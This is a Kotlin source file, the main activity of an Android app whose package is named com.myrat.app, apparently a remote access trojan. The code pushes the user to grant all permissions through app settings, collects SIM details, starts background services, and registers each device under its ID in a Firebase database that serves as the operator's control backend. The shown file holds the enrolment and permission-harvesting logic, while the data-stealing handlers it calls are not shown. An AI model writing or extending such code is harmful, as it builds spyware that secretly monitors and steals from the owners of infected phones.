package com.myrat.app

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.handler.PermissionHandler
import com.myrat.app.handler.SimDetailsHandler
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import java.util.UUID

class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
    private lateinit var deviceId: String
    private lateinit var simDetailsHandler: SimDetailsHandler
    private var permissionHandler: PermissionHandler? = null
    private lateinit var serviceManager: ServiceManager
    private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
    private var doubleBackToExitPressedOnce = false
    private val handler = Handler(Looper.getMainLooper())
    private var appSettingsVisited = false
    private var permissionsRequested = false

    companion object {
        private const val APP_SETTINGS_REQUEST_CODE = 1001

        fun getDeviceId(context: Context): String {
            return try {
                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("deviceId", null)
                if (deviceId.isNullOrEmpty()) {
                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = when {
                        !androidId.isNullOrEmpty() && androidId != "9774d56d682e549c" -> androidId
                        else -> UUID.randomUUID().toString()
                    }
                    prefs.edit().putString("deviceId", deviceId).apply()
                    Logger.log("Generated new deviceId: $deviceId")
                }
                deviceId
            } catch (e: Exception) {
                Logger.error("Error getting device ID", e)
                "fallback_${System.currentTimeMillis()}"
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        try {
            initializeFirebase()
            initializeDeviceId()
            initializeHandlers()
            initializeDatabaseReference()

            val prefs = getSharedPreferences("app_flow", Context.MODE_PRIVATE)
            appSettingsVisited = prefs.getBoolean("app_settings_visited", false)

            if (!appSettingsVisited) {
                Logger.log("First launch - opening app settings")
                openAppSettings()
            } else {
                Logger.log("Starting permission flow")
                startPermissionFlow()
            }

            checkAndCreateDeviceNode()
        } catch (e: Exception) {
            handleCriticalError(e)
        }
    }

    private fun initializeFirebase() {
        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this)
            Logger.log("Firebase initialized")
        }
    }

    private fun initializeDeviceId() {
        deviceId = getDeviceId(this)
        if (deviceId.isEmpty()) {
            throw IllegalStateException("Device ID is empty")
        }
    }

    private fun initializeHandlers() {
        simDetailsHandler = SimDetailsHandler(this, deviceId)
        serviceManager = ServiceManager(this)
        permissionHandler = PermissionHandler(this, simDetailsHandler, serviceManager)
        Logger.log("Handlers initialized")
    }

    private fun initializeDatabaseReference() {
        deviceRef = Firebase.database.getReference("Device").child(deviceId)
        Logger.log("Firebase database reference initialized")
    }

    private fun handleCriticalError(e: Exception) {
        Logger.error("Critical error in onCreate", e)
        Toast.makeText(this, "App initialization failed", Toast.LENGTH_LONG).show()
        handler.postDelayed({
            try {
                finish()
                startActivity(Intent(this, MainActivity::class.java))
            } catch (restartException: Exception) {
                Logger.error("Failed to restart activity", restartException)
            }
        }, 2000)
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivityForResult(intent, APP_SETTINGS_REQUEST_CODE)
            Toast.makeText(
                this,
                "Please enable all permissions in settings",
                Toast.LENGTH_LONG
            ).show()
        } catch (e: Exception) {
            Logger.error("Failed to open app settings", e)
            startPermissionFlow()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == APP_SETTINGS_REQUEST_CODE) {
            Logger.log("Returned from app settings")
            getSharedPreferences("app_flow", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("app_settings_visited", true)
                .apply()
            appSettingsVisited = true
            handler.postDelayed({ startPermissionFlow() }, 500)
        }
    }

    private fun startPermissionFlow() {
        if (!permissionsRequested && !isFinishing && !isDestroyed) {
            permissionsRequested = true
            handler.postDelayed({
                try {
                    permissionHandler?.requestPermissions()
                } catch (e: Exception) {
                    Logger.error("Failed to request permissions", e)
                    Toast.makeText(this, "Permission request failed", Toast.LENGTH_SHORT).show()
                }
            }, 500)
        }
    }

    private fun checkAndCreateDeviceNode() {
        deviceRef.addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                if (!snapshot.exists()) {
                    deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                        .addOnSuccessListener { Logger.log("Created new device node: $deviceId") }
                        .addOnFailureListener { e -> Logger.error("Failed to create device node", e) }
                }
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                Logger.error("Error checking device node: ${error.message}")
            }
        })
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || isDestroyed) return

        try {
            if (!appSettingsVisited) return
            permissionHandler?.handleResume()
            serviceManager.checkAndStartAvailableServices()
        } catch (e: Exception) {
            Logger.error("Error in onResume", e)
            Toast.makeText(this, "Error resuming app", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        permissionHandler?.onPermissionsGranted(requestCode, perms)
    }

    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        permissionHandler?.onPermissionsDenied(requestCode, perms)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
    }

    override fun onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed()
            finish()
            return
        }
        doubleBackToExitPressedOnce = true
        Toast.makeText(this, "Press BACK again to exit", Toast.LENGTH_SHORT).show()
        handler.postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            permissionHandler?.cleanup()
            serviceManager.cleanup()
            handler.removeCallbacksAndMessages(null)
            Logger.log("MainActivity cleaned up")
        } catch (e: Exception) {
            Logger.error("Error in onDestroy", e)
        }
    }
}